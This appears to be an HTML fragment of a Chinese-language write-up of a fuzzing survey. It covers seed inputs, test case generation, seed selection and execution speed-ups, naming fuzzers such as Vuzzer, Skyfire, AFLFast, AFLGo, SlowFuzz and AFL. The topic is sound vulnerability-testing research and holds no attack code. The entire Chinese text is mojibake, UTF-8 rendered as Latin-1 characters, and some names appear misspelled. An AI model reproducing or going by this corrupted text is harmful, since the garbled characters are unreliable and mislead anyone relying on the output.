                ><br>é—®é¢˜Aï¼šå¦‚ä½•è·å¾—åˆå§‹è¾“å…¥ï¼Ÿ<br>å¤§å¤šæ•°æœ€å…ˆè¿›çš„åŸºäºè¦†ç›–ç‡çš„ fuzzer é‡‡ç”¨åŸºäºå˜å¼‚çš„æµ‹è¯•ç”¨ä¾‹ç”Ÿæˆç­–ç•¥ï¼Œè¿™åœ¨å¾ˆå¤§ç¨‹åº¦ä¸Šå–å†³äºåˆå§‹ç§å­è¾“å…¥çš„è´¨é‡ã€‚è‰¯å¥½çš„åˆå§‹ç§å­è¾“å…¥å¯ä»¥æ˜¾è‘—æé«˜ fuzz çš„æ•ˆç‡å’Œæœ‰æ•ˆæ€§ã€‚å…·ä½“æ¥è¯´ï¼Œ<br>ï¼ˆ1ï¼‰æä¾›æ ¼å¼è‰¯å¥½çš„ç§å­è¾“å…¥å¯ä»¥èŠ‚çœæ„å»ºä¸€ä¸ªç§å­æ‰€éœ€çš„å¤§é‡CPUæ—¶é—´<br>ï¼ˆ2ï¼‰è‰¯å¥½çš„åˆå§‹è¾“å…¥å¯ä»¥æ»¡è¶³å¤æ‚æ–‡ä»¶æ ¼å¼çš„è¦æ±‚<br>ï¼ˆ3ï¼‰åŸºäºæ ¼å¼è‰¯å¥½çš„ç§å­è¾“å…¥çš„å˜å¼‚æ›´æœ‰å¯èƒ½ç”Ÿæˆæ›´æ·±å…¥çš„æµ‹è¯•ç”¨ä¾‹ã€‚ä»è€Œåˆ°è¾¾éš¾ä»¥åˆ°è¾¾çš„è·¯å¾„<br>ï¼ˆ4ï¼‰è‰¯å¥½çš„ç§å­è¾“å…¥å¯ä»¥åœ¨å¤šæ¬¡æµ‹è¯•ä¸­é‡å¤ä½¿ç”¨</p>
<p>æ”¶é›†ç§å­è¾“å…¥çš„å¸¸ç”¨æ–¹æ³•åŒ…æ‹¬ä½¿ç”¨æ ‡å‡†æ•°æ®ã€ä»å› ç‰¹ç½‘ä¸ŠæŠ“å–ã€ä½¿ç”¨ç°æœ‰çš„POCæ ·æœ¬ã€‚å¼€æ”¾æºä»£ç çš„åº”ç”¨ç¨‹åºåœ¨å‘å¸ƒåŒæ—¶ä¼šé™„å¸¦ä¸€ä¸ªç”¨äºæµ‹è¯•ç¨‹åºåŠŸèƒ½çš„åŸºå‡†æ•°æ®ã€‚è¿™äº›æ•°æ®æ˜¯æ ¹æ®åº”ç”¨ç¨‹åºçš„ç‰¹æ€§å’ŒåŠŸèƒ½æ„å»ºçš„ï¼Œè¿™äº›ç‰¹æ€§å’ŒåŠŸèƒ½è‡ªç„¶åœ°æ„å»ºäº†ä¸€ç»„è‰¯å¥½çš„ç§å­è¾“å…¥ã€‚è€ƒè™‘åˆ°ç›®æ ‡åº”ç”¨è¾“å…¥çš„å¤šæ ·æ€§ï¼Œä»ç½‘ç»œæŠ“å–æ˜¯æœ€ç›´è§‚çš„æ–¹æ³•ã€‚æˆ‘ä»¬å¯ä»¥è½»æ¾ä¸‹è½½å…·æœ‰ç‰¹å®šæ ¼å¼çš„æ–‡ä»¶ã€‚æ­¤å¤–ï¼Œå¯¹äºä¸€äº›å¸¸ç”¨çš„æ–‡ä»¶æ ¼å¼ï¼Œç½‘ç»œä¸Šæœ‰è®¸å¤šå¼€æ”¾çš„æµ‹è¯•é¡¹ç›®æä¾›å…è´¹çš„æµ‹è¯•æ•°æ®é›†ã€‚ä½¿ç”¨ç°æœ‰çš„POCæ ·æœ¬ä¹Ÿæ˜¯ä¸€ä¸ªå¥½ä¸»æ„ã€‚ç„¶è€Œï¼Œç§å­è¾“å…¥é‡è¿‡å¤§ä¼šé€ æˆç¬¬ä¸€æ¬¡è¿è¡Œçš„æ—¶é—´æµªè´¹ï¼Œç”±æ­¤å¸¦æ¥å¦ä¸€ä¸ªé—®é¢˜ï¼Œå³å¦‚ä½•æå–åŸå§‹è¯­æ–™ã€‚aflæä¾›äº†ä¸€ä¸ªå·¥å…·ï¼Œå®ƒç”¨äºæå–å®ç°ç›¸åŒä»£ç è¦†ç›–ç‡çš„æœ€å°è¾“å…¥é›†ã€‚</p>
<p>é—®é¢˜Bï¼šå¦‚ä½•ç”Ÿæˆæµ‹è¯•ç”¨ä¾‹ï¼Ÿ<br>æµ‹è¯•ç”¨ä¾‹çš„è´¨é‡æ˜¯å½±å“ fuzz æ•ˆç‡å’Œæœ‰æ•ˆæ€§çš„é‡è¦å› ç´ ã€‚é¦–å…ˆï¼Œå¥½çš„æµ‹è¯•ç”¨ä¾‹å¯ä»¥æ¢ç´¢åˆ°æ›´å¤šçš„ç¨‹åºæ‰§è¡ŒçŠ¶æ€ï¼Œå¹¶åœ¨æ›´çŸ­çš„æ—¶é—´å†…è¦†ç›–æ›´å¤šçš„ä»£ç ã€‚æ­¤å¤–ï¼Œå¥½çš„æµ‹è¯•ç”¨ä¾‹å¯ä»¥ç„å‡†æ½œåœ¨çš„æ˜“å—æ”»å‡»çš„ä½ç½®ï¼Œä»è€Œæ›´å¿«åœ°å‘ç°ç¨‹åºé”™è¯¯ã€‚å› æ­¤ï¼Œå¦‚ä½•åŸºäºç§å­è¾“å…¥ç”Ÿæˆè‰¯å¥½çš„æµ‹è¯•ç”¨ä¾‹æ˜¯ä¸€ä¸ªé‡è¦çš„é—®é¢˜ã€‚</p>
<p>Rawat ç­‰äººï¼ˆ2017ï¼‰æå‡ºäº† Vuzzerï¼Œä¸€ç§ç»“åˆé™æ€å’ŒåŠ¨æ€åˆ†æçš„åº”ç”¨æ„ŸçŸ¥ç°ç›’ fuzzerã€‚ç§å­è¾“å…¥çš„å˜å¼‚æ¶‰åŠåˆ°ä¸¤ä¸ªå…³é”®é—®é¢˜ï¼šåœ¨å“ªé‡Œå˜å¼‚ä»¥åŠå˜å¼‚æˆä»€ä¹ˆã€‚å…·ä½“æ¥è¯´ï¼ŒVuzzer åœ¨è¿›å…¥ä¸»å¾ªç¯ä¹‹å‰é€šè¿‡é™æ€åˆ†ææå–å³æ—¶å€¼ã€å¹»æ•°å€¼å’Œå…¶ä»–å½±å“æ§åˆ¶æµçš„ç‰¹å¾å­—ç¬¦ä¸²ã€‚åœ¨ç¨‹åºæ‰§è¡Œè¿‡ç¨‹ä¸­ï¼ŒVuzzer ä½¿ç”¨åŠ¨æ€æ±¡ç‚¹åˆ†ææŠ€æœ¯æ¥æ”¶é›†å½±å“æ§åˆ¶æµåˆ†æ”¯çš„ä¿¡æ¯ï¼ŒåŒ…æ‹¬ç‰¹å®šå€¼å’Œç›¸åº”çš„åç§»é‡ã€‚Vuzzer é€šè¿‡å¯¹æ”¶é›†åˆ°çš„å€¼è¿›è¡Œå˜å¼‚ï¼Œå¹¶åœ¨è¯†åˆ«çš„ä½ç½®è¿›è¡Œå˜å¼‚ï¼Œå¯ä»¥ç”Ÿæˆæ›´ç¬¦åˆåˆ†æ”¯åˆ¤æ–­æ¡ä»¶çš„æµ‹è¯•ç”¨ä¾‹ï¼Œå¹¶é€šè¿‡ç¨‹åºéªŒè¯ã€‚ä½†æ˜¯ï¼ŒVuzzer ä»ç„¶æ— æ³•åœ¨ç¨‹åºä¸­é€šè¿‡å…¶ä»–ç±»å‹çš„éªŒè¯ï¼Œä¾‹å¦‚åŸºäºå“ˆå¸Œçš„æ ¡éªŒå’Œã€‚Vuzzer çš„æ’æ¡©æ¨¡å—ã€ä¸»å¾ªç¯ç­‰æ¨¡å—æ˜¯åŸºäº Pin å®ç°çš„ï¼Œä¸AFLç›¸æ¯”é€Ÿåº¦æ›´æ…¢ã€‚</p>
<p>Wangç­‰äººï¼ˆ2017ï¼‰æå‡ºçš„ Skyfire æ˜¯ä¸€ç§æ•°æ®é©±åŠ¨çš„ç§å­ç”Ÿæˆè§£å†³æ–¹æ¡ˆã€‚Skyfireä»çˆ¬å–çš„è¾“å…¥ä¸­å­¦ä¹ æ¦‚ç‡ä¸Šä¸‹æ–‡æ•æ„Ÿè¯­æ³•ï¼ˆPCSGï¼‰ï¼Œå¹¶åœ¨ç”Ÿæˆè¾“å…¥æ—¶åˆ©ç”¨æ‰€å­¦çŸ¥è¯†ã€‚å®éªŒè¡¨æ˜ï¼ŒSkyfireç”Ÿæˆçš„æµ‹è¯•ç”¨ä¾‹è¦†ç›–çš„ä»£ç æ¯”AFLå¤šï¼Œå‘ç°çš„é”™è¯¯ä¹Ÿå¤šã€‚åŒæ—¶ä¹Ÿè¯æ˜äº†æµ‹è¯•ç”¨ä¾‹çš„è´¨é‡æ˜¯å½±å“ fuzz æ•ˆç‡å’Œæœ‰æ•ˆæ€§çš„é‡è¦å› ç´ ã€‚</p>
<p>éšç€æœºå™¨å­¦ä¹ æŠ€æœ¯çš„å‘å±•å’Œå¹¿æ³›åº”ç”¨ï¼Œä¸€äº›ç ”ç©¶è€…è¯•å›¾åˆ©ç”¨æœºå™¨å­¦ä¹ æŠ€æœ¯æ¥è¾…åŠ©æµ‹è¯•ç”¨ä¾‹çš„ç”Ÿæˆã€‚Godefraoid ç­‰äººä½¿ç”¨åŸºäºç¥ç»ç½‘ç»œçš„ç»Ÿè®¡æœºå™¨å­¦ä¹ æŠ€æœ¯-NIQUESè‡ªåŠ¨ç”Ÿæˆæµ‹è¯•ç”¨ä¾‹ã€‚å…·ä½“æ¥è¯´ï¼Œä»–ä»¬é¦–å…ˆé€šè¿‡æœºå™¨å­¦ä¹ æŠ€æœ¯ä»ä¸€å †æœ‰æ•ˆçš„è¾“å…¥ä¸­å­¦ä¹ è¾“å…¥æ ¼å¼ï¼Œç„¶åå°†å­¦ä¹ åˆ°çš„çŸ¥è¯†æ æ†åŒ–(?)ï¼ŒæŒ‡å¯¼æµ‹è¯•ç”¨ä¾‹çš„ç”Ÿæˆã€‚å®ƒä»¬åœ¨å¾®è½¯ edge æµè§ˆå™¨ä¸­çš„ pdf è§£æå™¨ä¸Šè¿›è¡Œäº† fuzzã€‚å°½ç®¡å®éªŒæ²¡æœ‰å–å¾—ä»¤äººé¼“èˆçš„ç»“æœï¼Œä½†ä»ç„¶æ˜¯ä¸€ä¸ªè‰¯å¥½çš„æ€è·¯ã€‚Rajpal ç­‰äººï¼ˆ2017ï¼‰ä½¿ç”¨ç¥ç»ç½‘ç»œä»è¿‡å»çš„ fuzz ç”¨ä¾‹ä¸­å­¦ä¹ ï¼Œå¹¶é¢„æµ‹è¾“å…¥æ–‡ä»¶ä¸­è¦å˜å¼‚çš„å­—èŠ‚ã€‚Nichols ç­‰äººï¼ˆ2017ï¼‰ä½¿ç”¨ç”Ÿæˆå¯¹æŠ—æ€§ç½‘ç»œï¼ˆganï¼‰æ¨¡å‹å¸®åŠ©ä½¿ç”¨æ–°ç§å­æ–‡ä»¶é‡æ–°åˆå§‹åŒ–ç³»ç»Ÿã€‚å®éªŒè¡¨æ˜ï¼Œganæ¯” lstm æ›´å¿«ã€æ›´æœ‰æ•ˆï¼Œæœ‰åŠ©äºå‘ç°æ›´å¤šçš„ä»£ç è·¯å¾„ã€‚</p>
<p>é—®é¢˜Cï¼šå¦‚ä½•ä»ç§å­æ± (seed pool)ä¸­é€‰æ‹©ç§å­ï¼Ÿ<br>åœ¨ä¸»å¾ªç¯ä¸­ï¼Œæ–°ä¸€è½®æµ‹è¯•å¼€å§‹æ—¶ï¼Œfuzzer ä»ç§å­æ± ä¸­é‡å¤é€‰æ‹©ç§å­è¿›è¡Œå˜å¼‚ã€‚å¦‚ä½•ä»æ± ä¸­é€‰æ‹©ç§å­æ˜¯ fuzz ä¸­å¦ä¸€ä¸ªé‡è¦çš„å¼€æ”¾æ€§é—®é¢˜ã€‚å‰äººçš„å·¥ä½œå·²ç»è¯æ˜ï¼Œè‰¯å¥½çš„ç§å­é€‰æ‹©ç­–ç•¥å¯ä»¥æ˜¾è‘—æé«˜ fuzz æ•ˆç‡ï¼Œå¹¶æœ‰åŠ©äºæ›´å¿«åœ°å‘ç°æ›´å¤šçš„é”™è¯¯ã€‚æœ‰äº†è‰¯å¥½çš„ç§å­é€‰æ‹©ç­–ç•¥ï¼Œfuzzerå¯ä»¥<br>ï¼ˆ1ï¼‰ä¼˜å…ˆå¤„ç†é‚£äº›æ›´æœ‰å¸®åŠ©çš„ç§å­ï¼ŒåŒ…æ‹¬è¦†ç›–æ›´å¤šçš„ä»£ç ï¼Œæ›´å®¹æ˜“è§¦å‘æ¼æ´<br>ï¼ˆ2ï¼‰å‡å°‘é‡å¤æ‰§è¡Œè·¯å¾„ï¼ŒèŠ‚çœè®¡ç®—èµ„æº<br>ï¼ˆ3ï¼‰ä¼˜åŒ–é€‰æ‹©ç§å­ï¼Œè¦†ç›–æ›´æ·±æ›´æ˜“å—æ”»å‡»çš„ä»£ç ï¼Œå¸®åŠ©æ›´å¿«åœ°è¯†åˆ«éšè—çš„æ¼æ´ã€‚</p>
<p>BoÌˆhme ç­‰äººï¼ˆ2017ï¼‰æå‡ºäº†åŸºäºè¦†ç›–ç‡çš„ç°ç›’ fuzzer AFLFASTã€‚ä»–ä»¬å‘ç°å¤§å¤šæ•°æµ‹è¯•ç”¨ä¾‹éƒ½é›†ä¸­åœ¨ç›¸åŒçš„å‡ ä¸ªè·¯å¾„ä¸Šã€‚ä¾‹å¦‚ï¼Œåœ¨ PNG å¤„ç†ç¨‹åºä¸­ï¼Œé€šè¿‡éšæœºå˜å¼‚ç”Ÿæˆçš„å¤§å¤šæ•°æµ‹è¯•ç”¨ä¾‹éƒ½æ˜¯æ— æ•ˆçš„ï¼Œå¹¶è§¦å‘é”™è¯¯å¤„ç†è·¯å¾„ã€‚aflfast å°†è·¯å¾„åˆ†ä¸ºé«˜é¢‘ç‡è·¯å¾„å’Œä½é¢‘ç‡è·¯å¾„ã€‚åœ¨ fuzz ä¸­ï¼Œaflfastæµ‹é‡å¯æ‰§è¡Œè·¯å¾„çš„é¢‘ç‡ï¼Œå¯¹ç§å­è¿›è¡Œä¼˜å…ˆçº§æ’åºï¼Œå¹¶å°†æ›´å¤šçš„è®¡ç®—èµ„æºåˆ†é…ç»™è¿è¡Œä½é¢‘ç‡è·¯å¾„çš„ç§å­ã€‚</p>
<p>Rawat ç­‰äººï¼ˆ2017ï¼‰æ•´åˆé™æ€å’ŒåŠ¨æ€åˆ†æï¼Œä»¥ç¡®å®šéš¾ä»¥æ·±å…¥çš„è·¯å¾„ï¼Œå¹¶ä¼˜å…ˆè€ƒè™‘æ·±å…¥è·¯å¾„çš„ç§å­ã€‚Vuzzer çš„ç§å­é€‰æ‹©ç­–ç•¥å¯ä»¥å¸®åŠ©æ‰¾åˆ°éšè—åœ¨æ·±å±‚è·¯å¾„ä¸­çš„æ¼æ´ã€‚</p>
<p>Aflgo é‡‡ç”¨å®šå‘é€‰æ‹©ç­–ç•¥ã€‚å®ƒå°†ä¸€äº›æ˜“å—æ”»å‡»çš„ä»£ç å®šä¹‰ä¸ºç›®æ ‡ä½ç½®ï¼Œå¹¶é€‰æ‹©æ›´æ¥è¿‘ç›®æ ‡ä½ç½®çš„æµ‹è¯•ç”¨ä¾‹ã€‚aflgoæ–‡ä»¶ä¸­æåˆ°äº†å››ç±»æ˜“å—æ”»å‡»çš„ä»£ç ï¼ŒåŒ…æ‹¬è¡¥ä¸ã€ç¨‹åºå´©æºƒç¼ºå°‘è¶³å¤Ÿçš„è·Ÿè¸ªä¿¡æ¯ã€é™æ€åˆ†æå·¥å…·éªŒè¯çš„ç»“æœä»¥åŠä¸æ•æ„Ÿä¿¡æ¯ç›¸å…³çš„ä»£ç ç‰‡æ®µã€‚é€šè¿‡é€‚å½“çš„å®šå‘ç®—æ³•ï¼Œaflgoå¯ä»¥åœ¨æ„Ÿå…´è¶£çš„ä»£ç ä¸Šåˆ†é…æ›´å¤šçš„æµ‹è¯•èµ„æºã€‚QTEP åˆ©ç”¨é™æ€ä»£ç åˆ†ææ¥æ£€æµ‹å®¹æ˜“å‡ºé”™çš„æºä»£ç ï¼Œå¹¶ä¼˜å…ˆå¤„ç†èƒ½å¤Ÿè¦†ç›–æ›´å¤šé”™è¯¯ä»£ç çš„ç§å­ã€‚aflgoå’Œqtepåœ¨å¾ˆå¤§ç¨‹åº¦ä¸Šä¾èµ–äºé™æ€åˆ†æå·¥å…·çš„æœ‰æ•ˆæ€§ã€‚ç„¶è€Œï¼Œç›®å‰çš„é™æ€åˆ†æå·¥å…·çš„è¯¯æŠ¥ç‡ä»ç„¶å¾ˆé«˜ï¼Œæ— æ³•ç»™å‡ºå‡†ç¡®çš„éªŒè¯ã€‚</p>
<p>å·²çŸ¥æ¼æ´çš„ç‰¹å¾ä¹Ÿå¯ç”¨äºç§å­é€‰æ‹©ç­–ç•¥ã€‚Slowfuzzï¼ˆPetsiosç­‰äºº2017ï¼‰çš„ä¸»è¦ fuzz ç›®æ ‡æ˜¯å¤æ‚ç®—æ³•çš„æ¼æ´ï¼Œè¿™äº›ç®—æ³•å¾€å¾€ä¼šæ¶ˆè€—å¤§é‡è®¡ç®—èµ„æºã€‚å› æ­¤ï¼Œslowfuzz æ›´åå‘äºé€‰æ‹©æ¶ˆè€—æ›´å¤šèµ„æºï¼ˆå¦‚cpuæ—¶é—´å’Œå†…å­˜ï¼‰çš„ç§å­ã€‚ç„¶è€Œï¼Œæ”¶é›†æ¶ˆè€—èµ„æºçš„ä¿¡æ¯ä¼šå¸¦æ¥å¾ˆå¤§çš„å¼€é”€ï¼Œé™ä½ fuzz çš„æ•ˆç‡ã€‚ä¾‹å¦‚ï¼Œä¸ºäº†æ”¶é›†cpuæ—¶é—´ï¼Œslowfuzz ç»Ÿè®¡æ‰§è¡Œçš„æŒ‡ä»¤æ•°ã€‚æ­¤å¤–ï¼Œslowfuzz å¯¹èµ„æºæ¶ˆè€—ä¿¡æ¯çš„å‡†ç¡®æ€§è¦æ±‚å¾ˆé«˜ã€‚</p>
<p>é—®é¢˜Dï¼šå¦‚ä½•æœ‰æ•ˆåœ°æµ‹è¯•åº”ç”¨ç¨‹åºï¼Ÿ<br>åœ¨ä¸»å¾ªç¯ä¸­ï¼Œç›®æ ‡åº”ç”¨ç”± fuzzer åå¤å¯åŠ¨å’Œç»ˆæ­¢ã€‚ä¼—æ‰€å‘¨çŸ¥ï¼Œå¯¹äºç”¨æˆ·ç«¯åº”ç”¨ç¨‹åºçš„ fuzzï¼Œè¿›ç¨‹çš„åˆ›å»ºå’Œç»ˆæ­¢å°†æ¶ˆè€—å¤§é‡çš„CPUæ—¶é—´ã€‚é¢‘ç¹çš„åˆ›å»ºå’Œç»ˆæ­¢è¿›ç¨‹ä¼šä¸¥é‡é™ä½ fuzz çš„æ•ˆç‡ã€‚å› æ­¤ï¼Œäººä»¬æå‡ºäº†å¾ˆå¤šä¼˜åŒ–æªæ–½ã€‚afl ä½¿ç”¨ä¸€ä¸ª forkserver æ–¹æ³•ï¼Œè¯¥æ–¹æ³•ä¸ºå·²åŠ è½½çš„ç¨‹åºåˆ›å»ºä¸€ä¸ªç›¸åŒçš„å…‹éš†ä½“ï¼Œå¹¶åœ¨æ¯æ¬¡è¿è¡Œæ—¶é‡ç”¨è¯¥å…‹éš†ä½“ã€‚æ­¤å¤–ï¼Œafl è¿˜æä¾›äº†æŒä¹…æ¨¡å¼ï¼ˆpersistent modeï¼‰å’Œå¹¶è¡Œæ¨¡å¼ï¼ˆparallel modeï¼‰ï¼Œå‰è€…æœ‰åŠ©äºé¿å…ç¼“æ…¢çš„ execve() ç­‰ç³»ç»Ÿè°ƒç”¨å’Œé“¾æ¥è¿‡ç¨‹çš„å¼€é”€ï¼Œåè€…æœ‰åŠ©äºåœ¨å¤šæ ¸ç³»ç»Ÿä¸Šå¹¶è¡Œæµ‹è¯•ã€‚è‹±ç‰¹å°”å¤„ç†å™¨è·Ÿè¸ªï¼ˆPTï¼‰ï¼ˆjames 2013ï¼‰æŠ€æœ¯ç”¨äºå†…æ ¸ fuzzï¼Œä»¥èŠ‚çœè¦†ç›–ç‡è·Ÿè¸ªå¸¦æ¥çš„å¼€é”€ã€‚Xuç­‰äººï¼ˆ2017ï¼‰æ—¨åœ¨è§£å†³å¤šæ ¸æœºä¸Šå¹¶è¡Œ fuzz çš„æ€§èƒ½ç“¶é¢ˆã€‚é€šè¿‡è®¾è®¡å’Œå®ç°ä¸‰ä¸ªæ–°çš„æ“ä½œåŸè¯­ï¼Œä»–ä»¬è¡¨ç¤ºè‡ªå·±çš„å·¥ä½œå¯ä»¥æ˜¾è‘—åŠ å¿«ç°ä»£ fuzzer çš„é€Ÿåº¦ï¼Œå¦‚ afl å’Œ libfuzzerã€‚</p>
<p><strong>æŠ€æœ¯èåˆ</strong></p>
<p>ç°ä»£åº”ç”¨ç¨‹åºé€šå¸¸ä½¿ç”¨éå¸¸å¤æ‚çš„æ•°æ®ç»“æ„ï¼Œå¯¹å¤æ‚æ•°æ®ç»“æ„çš„è§£ææ›´å®¹æ˜“å¸¦æ¥æ¼æ´ã€‚é‡‡ç”¨éšæœºå˜å¼‚æ–¹æ³•çš„ fuzz ç­–ç•¥å°†ç”Ÿæˆå¤§é‡æ— æ•ˆçš„æµ‹è¯•ç”¨ä¾‹ï¼Œfuzz æ•ˆç‡ä½ã€‚ç›®å‰æœ€å…ˆè¿›çš„ fuzzer é€šå¸¸é‡‡ç”¨æ™ºèƒ½ fuzz ç­–ç•¥ã€‚æ™ºèƒ½ fuzzer é€šè¿‡ç¨‹åºåˆ†ææŠ€æœ¯æ”¶é›†ç¨‹åºæ§åˆ¶æµå’Œæ•°æ®æµä¿¡æ¯ï¼Œä»è€Œåˆ©ç”¨æ”¶é›†åˆ°çš„ä¿¡æ¯æ”¹è¿›æµ‹è¯•ç”¨ä¾‹çš„ç”Ÿæˆã€‚ç”±æ™ºèƒ½ fuzzer ç”Ÿæˆçš„æµ‹è¯•ç”¨ä¾‹æ›´æœ‰é’ˆå¯¹æ€§ï¼Œæ›´æœ‰å¯èƒ½æ»¡è¶³ç¨‹åºå¯¹æ•°æ®ç»“æ„å’Œé€»è¾‘åˆ¤æ–­çš„è¦æ±‚ã€‚å›¾5æç»˜äº†æ™ºèƒ½ fuzzer çš„è‰å›¾ã€‚ä¸ºäº†æ„å»ºä¸€ä¸ªæ™ºèƒ½ fuzzer ï¼Œé›†æˆäº†å¤šç§æŠ€æœ¯ã€‚å¦‚å‰å‡ èŠ‚æ‰€è¿°ï¼Œfuzz åœ¨å®è·µä¸­é¢ä¸´è®¸å¤šæŒ‘æˆ˜ã€‚åœ¨è¿™ä¸€éƒ¨åˆ†ä¸­ï¼Œæˆ‘ä»¬è¯•å›¾æ€»ç»“ä»¥å‰çš„å·¥ä½œæ‰€ä½¿ç”¨çš„æŠ€æœ¯ï¼Œä»¥åŠè¿™äº›æŠ€æœ¯å¦‚ä½•åœ¨ fuzz è¿‡ç¨‹ä¸­åº”å¯¹æŒ‘æˆ˜ã€‚</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/fuzzing_a_survey11.png"
                     
                ></p>
<p><strong>ç”Ÿæˆæµ‹è¯•ç”¨ä¾‹</strong><br>å¦‚å‰æ‰€è¿°ï¼Œfuzzing ä¸­çš„æµ‹è¯•ç”¨ä¾‹æ˜¯ç”¨<strong>åŸºäºç”Ÿæˆçš„æ–¹æ³•</strong>æˆ–<strong>åŸºäºå˜å¼‚çš„æ–¹æ³•</strong>ç”Ÿæˆçš„ã€‚å¦‚ä½•ç”Ÿæˆæ»¡è¶³å¤æ‚æ•°æ®ç»“æ„è¦æ±‚ä¸”æ›´å®¹æ˜“è§¦å‘éš¾ä»¥åˆ°è¾¾è·¯å¾„çš„æµ‹è¯•ç”¨ä¾‹æ˜¯ä¸€ä¸ªå…³é”®çš„æŒ‘æˆ˜ã€‚ç ”ç©¶è€…ä»¬æå‡ºäº†å¾ˆå¤šè§£å†³æ–¹æ¡ˆã€‚<br>åœ¨åŸºäºç”Ÿæˆçš„ fuzz ä¸­ï¼Œç”Ÿæˆå™¨æ ¹æ®è¾“å…¥æ•°æ®æ ¼å¼å’Œé…ç½®æ–‡ä»¶ç”Ÿæˆæµ‹è¯•ç”¨ä¾‹ã€‚ä¾‹å¦‚æ–‡ä»¶å¤„ç†ç¨‹åºï¼Œæ–‡æ¡£ä¸­ä»…ä»…æåˆ°äº†å¸¸ç”¨çš„æ–‡ä»¶æ ¼å¼ï¼Œä½†æ˜¯æ²¡æœ‰æåˆ°ä¸€äº›å°ä¼—æ–‡ä»¶æ ¼å¼ã€‚å¦‚ä½•è·å–è¾“å…¥çš„æ ¼å¼ä¿¡æ¯æ˜¯ä¸€ä¸ªå¾ˆéš¾è§£å†³çš„é—®é¢˜ã€‚ä¸€èˆ¬é‡‡ç”¨æœºå™¨å­¦ä¹ æŠ€æœ¯å’Œæ ¼å¼åŒ–æ–¹æ³•æ¥è§£å†³é—®é¢˜ã€‚Godefroid ç­‰äººä½¿ç”¨æœºå™¨å­¦ä¹ æŠ€æœ¯ï¼Œç‰¹åˆ«æ˜¯é€’å½’ç¥ç»ç½‘ç»œï¼Œå­¦ä¹ è¾“å…¥æ–‡ä»¶çš„è¯­æ³•ï¼Œä»è€Œä½¿ç”¨å­¦ä¹ çš„è¯­æ³•ç”Ÿæˆæ ¼å¼åˆé€‚çš„æµ‹è¯•ç”¨ä¾‹ã€‚Wang ç­‰äººä½¿ç”¨æ ¼å¼æ–¹æ³•ï¼Œå…·ä½“æ¥è¯´ï¼Œå®ƒå®šä¹‰äº†ä¸€ä¸ªæ¦‚ç‡ä¸Šä¸‹æ–‡æ•æ„Ÿè¯­æ³•ï¼Œå¹¶æå–æ ¼å¼çŸ¥è¯†æ¥ç”Ÿæˆæ ¼å¼è‰¯å¥½çš„ç§å­è¾“å…¥ã€‚</p>
<p>æ›´å¤šæœ€å…ˆè¿›çš„ fuzzer é‡‡ç”¨åŸºäºå˜å¼‚çš„ fuzz ç­–ç•¥ã€‚åœ¨å˜å¼‚è¿‡ç¨‹ä¸­ï¼Œé€šè¿‡ä¿®æ”¹éƒ¨åˆ†ç§å­è¾“å…¥æ¥ç”Ÿæˆæµ‹è¯•ç”¨ä¾‹ã€‚åœ¨å˜å¼‚ fuzz è¿‡ç¨‹ä¸­ï¼Œå˜å¼‚æ¨¡å—éšæœºåœ°å°†ç§å­çš„å­—èŠ‚æ•°ä¿®æ”¹ä¸ºéšæœºå€¼æˆ–å¤šä¸ªç‰¹æ®Šå€¼ï¼Œè¿™å®é™…ä¸Šæ˜¯éå¸¸ä½æ•ˆçš„ã€‚å› æ­¤ï¼Œå¦‚ä½•ç¡®å®šè¦ä¿®æ”¹çš„ä½ç½®å’Œä¿®æ”¹æ—¶ä½¿ç”¨çš„å€¼æ˜¯å¦ä¸€ä¸ªå…³é”®é—®é¢˜ã€‚<br>åœ¨åŸºäºè¦†ç›–çš„ fuzz ä¸­ï¼Œåº”è¯¥é¦–å…ˆä¿®æ”¹å¯èƒ½å½±å“æ§åˆ¶æµä¼ è¾“çš„å­—èŠ‚ã€‚æ±¡ç‚¹åˆ†ææŠ€æœ¯ç”¨äºè·Ÿè¸ªå­—èŠ‚å¯¹æ§åˆ¶æµçš„å½±å“ï¼Œä»¥å®šä½å˜å¼‚ç§å­çš„å…³é”®å­—èŠ‚ï¼ˆRawatç­‰2017å¹´ï¼‰ã€‚çŸ¥é“å˜å¼‚çš„å…³é”®ä½ç½®åªæ˜¯å¼€å§‹ã€‚fuzz è¿‡ç¨‹é€šå¸¸åœ¨ä¸€äº›åˆ†æ”¯ä¸­è¢«é˜»å¡ã€‚ä¾‹å¦‚ï¼Œæ¡ä»¶åˆ¤æ–­ä¸­çš„ç‰¹å®šå­—èŠ‚å’Œå…¶ä»–å€¼è¿›è¡Œæ¯”è¾ƒã€‚é‡‡ç”¨é€†å‘å·¥ç¨‹å’Œæ±¡ç‚¹åˆ†æç­‰æŠ€æœ¯ã€‚é€šè¿‡æ‰«æäºŒè¿›åˆ¶ä»£ç ï¼Œä»æ¡ä»¶åˆ¤æ–­è¯­å¥ä¸­æ”¶é›†å³æ—¶å€¼ï¼Œå¹¶åœ¨å˜å¼‚è¿‡ç¨‹ä¸­åˆ©ç”¨é€‰æ‹©çš„å€¼ä½œä¸ºå€™é€‰å€¼ï¼Œfuzzer å¯ä»¥ç»•è¿‡ä¸€äº›å…³é”®çš„éªŒè¯å’Œæ£€æŸ¥ï¼Œå¦‚ç‰ˆæœ¬æ£€æŸ¥ã€‚<br>Rawat ç­‰äººï¼ˆ2017ï¼‰å°è¯•åˆ©ç”¨æœºå™¨å­¦ä¹ ç­‰æŠ€æœ¯è§£å†³æŒ‘æˆ˜ã€‚å¾®è½¯çš„ç ”ç©¶äººå‘˜åˆ©ç”¨æœºå™¨å­¦ä¹ æŠ€æœ¯ï¼Œæ¯”å¦‚æ·±åº¦ç¥ç»ç½‘ç»œï¼ˆdnnï¼‰ï¼Œé€šè¿‡lstmï¼ŒåŸºäºå…ˆå‰çš„ fuzz ç»éªŒï¼Œé¢„æµ‹å“ªäº›å­—èŠ‚ä¼šå‘ç”Ÿå˜å¼‚ï¼Œåœ¨å˜å¼‚ä¸­ä½¿ç”¨ä»€ä¹ˆå€¼ã€‚</p>
